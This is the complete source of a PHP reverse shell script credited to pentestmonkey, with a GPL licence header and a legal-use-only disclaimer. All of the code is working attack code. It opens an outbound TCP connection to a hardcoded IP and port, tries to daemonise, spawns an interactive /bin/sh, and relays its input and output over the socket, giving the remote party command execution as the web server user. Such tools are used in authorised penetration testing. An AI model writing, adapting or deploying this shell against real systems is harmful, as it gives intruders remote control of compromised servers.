    <?php\n
    // php-reverse-shell - A Reverse Shell implementation in PHP\n
    // Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n
    //\n
    // This tool may be used for legal purposes only.  Users take full responsibility\n
    // for any actions performed using this tool.  The author accepts no liability\n
    // for damage caused by this tool.  If these terms are not acceptable to you, then\n
    // do not use this tool.\n
    //\n
    // In all other respects the GPL version 2 applies:\n
    //\n
    // This program is free software; you can redistribute it and/or modify\n
    // it under the terms of the GNU General Public License version 2 as\n
    // published by the Free Software Foundation.\n
    //\n
    // This program is distributed in the hope that it will be useful,\n
    // but WITHOUT ANY WARRANTY; without even the implied warranty of\n
    // MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n
    // GNU General Public License for more details.\n
    //\n
    // You should have received a copy of the GNU General Public License along\n
    // with this program; if not, write to the Free Software Foundation, Inc.,\n
    // 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\n
    //\n
    // This tool may be used for legal purposes only.  Users take full responsibility\n
    // for any actions performed using this tool.  If these terms are not acceptable to\n
    // you, then do not use this tool.\n
    //\n
    // You are encouraged to send comments, improvements or suggestions to\n
    // me at pentestmonkey@pentestmonkey.net\n
    //\n
    // Description\n
    // -----------\n
    // This script will make an outbound TCP connection to a hardcoded IP and port.\n
    // The recipient will be given a shell running as the current user (apache normally).\n
    //\n
    // Limitations\n
    // -----------\n
    // proc_open and stream_set_blocking require PHP version 4.3+, or 5+\n
    // Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.\n
    // Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.\n
    //\n
    // Usage\n
    // -----\n
    // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.\n
    \n
    set_time_limit (0);\n
    $VERSION = "1.0";\n
    $ip = '10.10.100.50';  // CHANGE THIS\n
    $port = 8000;       // CHANGE THIS\n
    $chunk_size = 1400;\n
    $write_a = null;\n
    $error_a = null;\n
    $shell = 'uname -a; w; id; /bin/sh -i';\n
    $daemon = 0;\n
    $debug = 0;\n
    \n
    //\n
    // Daemonise ourself if possible to avoid zombies later\n
    //\n
    \n
    // pcntl_fork is hardly ever available, but will allow us to daemonise\n
    // our php process and avoid zombies.  Worth a try...\n
    if (function_exists('pcntl_fork')) {\n
    \t// Fork and have the parent process exit\n
    \t$pid = pcntl_fork();\n
    \t\n
    \tif ($pid == -1) {\n
    \t\tprintit("ERROR: Can't fork");\n
    \t\texit(1);\n
    \t}\n
    \t\n
    \tif ($pid) {\n
    \t\texit(0);  // Parent exits\n
    \t}\n
    \n
    \t// Make the current process a session leader\n
    \t// Will only succeed if we forked\n
    \tif (posix_setsid() == -1) {\n
    \t\tprintit("Error: Can't setsid()");\n
    \t\texit(1);\n
    \t}\n
    \n
    \t$daemon = 1;\n
    } else {\n
    \tprintit("WARNING: Failed to daemonise.  This is quite common and not fatal.");\n
    }\n
    \n
    // Change to a safe directory\n
    chdir("/");\n
    \n
    // Remove any umask we inherited\n
    umask(0);\n
    \n
    //\n
    // Do the reverse shell...\n
    //\n
    \n
    // Open reverse connection\n
    $sock = fsockopen($ip, $port, $errno, $errstr, 30);\n
    if (!$sock) {\n
    \tprintit("$errstr ($errno)");\n
    \texit(1);\n
    }\n
    \n
    // Spawn shell process\n
    $descriptorspec = array(\n
       0 => array("pipe", "r"),  // stdin is a pipe that the child will read from\n
       1 => array("pipe", "w"),  // stdout is a pipe that the child will write to\n
       2 => array("pipe", "w")   // stderr is a pipe that the child will write to\n
    );\n
    \n
    $process = proc_open($shell, $descriptorspec, $pipes);\n
    \n
    if (!is_resource($process)) {\n
    \tprintit("ERROR: Can't spawn shell");\n
    \texit(1);\n
    }\n
    \n
    // Set everything to non-blocking\n
    // Reason: Occsionally reads will block, even though stream_select tells us they won't\n
    stream_set_blocking($pipes[0], 0);\n
    stream_set_blocking($pipes[1], 0);\n
    stream_set_blocking($pipes[2], 0);\n
    stream_set_blocking($sock, 0);\n
    \n
    printit("Successfully opened reverse shell to $ip:$port");\n
    \n
    while (1) {\n
    \t// Check for end of TCP connection\n
    \tif (feof($sock)) {\n
    \t\tprintit("ERROR: Shell connection terminated");\n
    \t\tbreak;\n
    \t}\n
    \n
    \t// Check for end of STDOUT\n
    \tif (feof($pipes[1])) {\n
    \t\tprintit("ERROR: Shell process terminated");\n
    \t\tbreak;\n
    \t}\n
    \n
    \t// Wait until a command is end down $sock, or some\n
    \t// command output is available on STDOUT or STDERR\n
    \t$read_a = array($sock, $pipes[1], $pipes[2]);\n
    \t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n
    \n
    \t// If we can read from the TCP socket, send\n
    \t// data to process's STDIN\n
    \tif (in_array($sock, $read_a)) {\n
    \t\tif ($debug) printit("SOCK READ");\n
    \t\t$input = fread($sock, $chunk_size);\n
    \t\tif ($debug) printit("SOCK: $input");\n
    \t\tfwrite($pipes[0], $input);\n
    \t}\n
    \n
    \t// If we can read from the process's STDOUT\n
    \t// send data down tcp connection\n
    \tif (in_array($pipes[1], $read_a)) {\n
    \t\tif ($debug) printit("STDOUT READ");\n
    \t\t$input = fread($pipes[1], $chunk_size);\n
    \t\tif ($debug) printit("STDOUT: $input");\n
    \t\tfwrite($sock, $input);\n
    \t}\n
    \n
    \t// If we can read from the process's STDERR\n
    \t// send data down tcp connection\n
    \tif (in_array($pipes[2], $read_a)) {\n
    \t\tif ($debug) printit("STDERR READ");\n
    \t\t$input = fread($pipes[2], $chunk_size);\n
    \t\tif ($debug) printit("STDERR: $input");\n
    \t\tfwrite($sock, $input);\n
    \t}\n
    }\n
    \n
    fclose($sock);\n
    fclose($pipes[0]);\n
    fclose($pipes[1]);\n
    fclose($pipes[2]);\n
    proc_close($process);\n
    \n
    // Like print, but does nothing if we've daemonised ourself\n
    // (I can't figure out how to redirect STDOUT like a proper daemon)\n
    function printit ($string) {\n
    \tif (!$daemon) {\n
    \t\tprint "$string\n";\n
    \t}\n
    }\n
    \n
    ?> \n
    \n
    \n
    \n
